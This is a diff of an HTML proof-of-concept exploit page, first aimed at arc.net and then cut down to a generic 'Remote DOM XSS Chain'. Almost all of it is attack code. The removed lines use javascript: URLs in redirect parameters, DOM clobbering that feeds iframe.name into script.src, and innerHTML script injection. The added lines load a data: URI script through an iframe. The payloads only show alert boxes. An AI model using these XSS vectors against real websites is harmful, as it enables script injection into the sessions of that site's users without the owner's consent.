@@ -1,43 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Unified Exploit PoC for arc.net</title>
+  <title>Remote DOM XSS Chain</title>
 </head>
 <body>
-  <h1>🛠️ Unified Exploit for arc.net – Security Testing Only</h1>
-
-  <!-- ✅ ثغرة DOM XSS عبر <a href=javascript:...> -->
-  <h2>1️⃣ XSS via <a href="">href</a> Injection</h2>
-  <iframe id="xss-href" src="https://arc.net/?redirect=javascript:alert('XSS_href')"
-          width="100%" height="150" style="border:1px solid red;"></iframe>
-
-  <!-- ✅ DOM Clobbering + script.src from iframe.name -->
-  <h2>2️⃣ DOM Clobbering + script.src = iframe.name</h2>
-  <iframe id="iframe-clobber" name="data:text/javascript,alert('XSS_from_iframe_name')" 
-          src="about:blank" style="display:none;"></iframe>
+  <iframe id="my_script" name="src" src="data:text/javascript,alert('Remote DOM XSS executed')"></iframe>
 
   <script>
-    // تنفيذ الاستغلال بعد تأخير صغير
-    setTimeout(() => {
-      const s = document.createElement("script");
-      s.src = frames["iframe-clobber"].name; // script.src ← iframe.name
-      document.body.appendChild(s);
-    }, 1500);
+    window.my_script = document.getElementById("my_script");
+    const s = document.createElement("script");
+    s.src = my_script.src;
+    document.body.appendChild(s);
   </script>
-
-  <!-- ✅ DOM Script Injection عبر innerHTML -->
-  <h2>3️⃣ DOM-based Script Injection via innerHTML</h2>
-  <script>
-    setTimeout(() => {
-      const payload = document.createElement("script");
-      payload.innerHTML = "alert('XSS_from_innerHTML_script');";
-      document.head.appendChild(payload);
-    }, 3000);
-  </script>
-
-  <!-- ✅ تحويل خبيث باستخدام location.href -->
-  <h2>4️⃣ Fake Redirect Test via location.href</h2>
-  <a href="https://arc.net/?next=javascript:alert('redirect')">Test Redirect Injection</a>
-
 </body>
 </html>
